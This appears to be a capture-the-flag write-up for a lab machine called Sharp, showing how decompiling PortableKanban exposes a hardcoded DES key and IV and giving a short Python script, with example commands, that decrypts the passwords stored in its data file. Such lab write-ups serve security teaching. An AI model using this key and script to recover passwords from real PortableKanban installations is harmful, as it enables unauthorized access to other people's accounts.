# Alternative way to exploit Sharp

## Decompiling PortableKanban

Instead of modifying the _PortableKanban.pk3.bak_ file and creating an admin user to gain the credentials of the users in the GUI, the executable can be decompiled to check how the encryption works.

By opening _PortableKanban.exe_ and _PortableKanban.Data.dll_ in **dnSpy**, the class _Crypto_ shows that it uses **DES encryption** and contains two hardcoded secrets:
```
// Token: 0x04000001 RID: 1
private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ");

// Token: 0x04000002 RID: 2
private static byte[] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");
```

Creating a Python script to use these values and decrypt the passwords in _PortableKanban.pk3_:
```python
import sys
from base64 import b64decode
import des

passwd = b64decode(sys.argv[1])
c = des.DesKey(b'7ly6UznJ')
iv = b'XuVUm5fR'

print(c.decrypt(passwd, initial=iv, padding=True))
```

```
python3 decrypt_kanban.py 'k+iUoOvQYG98PuhhRC7/rg=='
python3 decrypt_kanban.py 'Ua3LyPFM175GN8D3+tqwLA=='
```
